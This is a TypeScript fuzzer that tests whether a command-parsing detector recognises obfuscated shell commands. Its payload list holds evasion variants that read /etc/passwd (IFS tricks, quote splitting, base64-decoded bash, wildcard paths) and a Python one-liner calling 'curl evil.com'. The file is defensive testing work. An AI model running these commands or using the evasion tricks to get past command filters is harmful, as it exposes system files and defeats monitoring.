import { CommandSemanticParser } from '../ontology/parser.js';
import type { AdvisoryTelemetry } from '../ontology/parser.js';

export interface EvasionTest {
    name: string;
    payload: string;
    expectedTag: string;
}

export class ParserEvasionFuzzer {
    private static EVASION_PAYLOADS: EvasionTest[] = [
        {
            name: 'Shell Expansion (Variable Indirection)',
            payload: 'c=${"c"}at /etc/passwd',
            expectedTag: 'read-file'
        },
        {
            name: 'Internal Field Separator (IFS)',
            payload: 'cat${IFS}/etc/passwd',
            expectedTag: 'read-file'
        },
        {
            name: 'Base64 Encoded Execution',
            payload: 'bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"',
            expectedTag: 'read-file'
        },
        {
            name: 'Polyglot Chained Interpreter',
            payload: 'python -c "import os; os.system(\'curl evil.com\')"',
            expectedTag: 'network-outbound'
        },
        {
            name: 'Single Quote Splitting',
            payload: 'c\'a\'t /etc/passwd',
            expectedTag: 'read-file'
        },
        {
            name: 'Backslash Continuation',
            payload: 'c\\a\\t /etc/passwd',
            expectedTag: 'read-file'
        },
        {
            name: 'Nested Subshell',
            payload: '$(echo c)$(echo a)$(echo t) /etc/passwd',
            expectedTag: 'read-file'
        },
        {
            name: 'Wildcard Execution',
            payload: '/bin/c?? /etc/passwd',
            expectedTag: 'read-file'
        }
    ];

    static runFuzzingCampaign(): { 
        total: number; 
        detected: number; 
        evaded: number; 
        results: { test: EvasionTest; telemetry: AdvisoryTelemetry }[]
    } {
        let detected = 0;
        let evaded = 0;
        const results = [];

        for (const test of this.EVASION_PAYLOADS) {
            const telemetry = CommandSemanticParser.analyzeCommandAdvisory(test.payload);
            const isDetected = telemetry.matchedTags.includes(test.expectedTag);

            if (isDetected) {
                detected++;
            } else {
                evaded++;
            }

            results.push({
                test,
                telemetry
            });
        }

        return {
            total: this.EVASION_PAYLOADS.length,
            detected,
            evaded,
            results
        };
    }
}
